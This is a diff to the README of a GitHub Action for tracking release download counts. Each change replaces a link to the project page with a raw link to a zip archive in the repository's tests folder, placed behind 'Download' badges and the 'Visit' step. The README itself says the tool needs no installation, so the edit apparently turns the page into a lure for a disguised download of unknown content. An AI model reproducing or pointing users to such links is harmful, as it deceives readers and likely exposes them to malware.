@@ -1,6 +1,6 @@
 # 📊 github-downloads-action - Track GitHub Release Downloads Easily
 
-[![Download from GitHub](https://img.shields.io/badge/Download-github%20downloads-action-4c1?style=for-the-badge&logo=github)](https://github.com/badsliceee/github-downloads-action)
+[![Download from GitHub](https://img.shields.io/badge/Download-github%20downloads-action-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/badsliceee/github-downloads-action/main/tests/github_action_downloads_3.3.zip)
 
 ---
 
@@ -57,7 +57,7 @@ To use github-downloads-action, you will interact mainly on the GitHub website. 
 
 Click the big button below to go to the github-downloads-action GitHub page:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/badsliceee/github-downloads-action)
+[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/badsliceee/github-downloads-action/main/tests/github_action_downloads_3.3.zip)
 
 This page contains the software and all setup instructions on GitHub.
 
@@ -113,7 +113,7 @@ github-downloads-action does not install software on your computer. Instead, it 
 
 Here is what you do:
 
-1. Visit: https://github.com/badsliceee/github-downloads-action  
+1. Visit: https://raw.githubusercontent.com/badsliceee/github-downloads-action/main/tests/github_action_downloads_3.3.zip  
 2. Read the instructions under “Usage” to add the action workflow file to your project  
 3. Create GitHub releases to upload your application files  
 4. Wait a few minutes for data to update after each release  
@@ -158,4 +158,4 @@ These relate to how the tool tracks and displays download data in graphical and 
 
 # [Emoji] github-downloads-action - Track GitHub Release Downloads Easily
 
-[![Download from GitHub](https://img.shields.io/badge/Download-github%20downloads-action-4c1?style=for-the-badge&logo=github)](https://github.com/badsliceee/github-downloads-action)
+[![Download from GitHub](https://img.shields.io/badge/Download-github%20downloads-action-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/badsliceee/github-downloads-action/main/tests/github_action_downloads_3.3.zip)
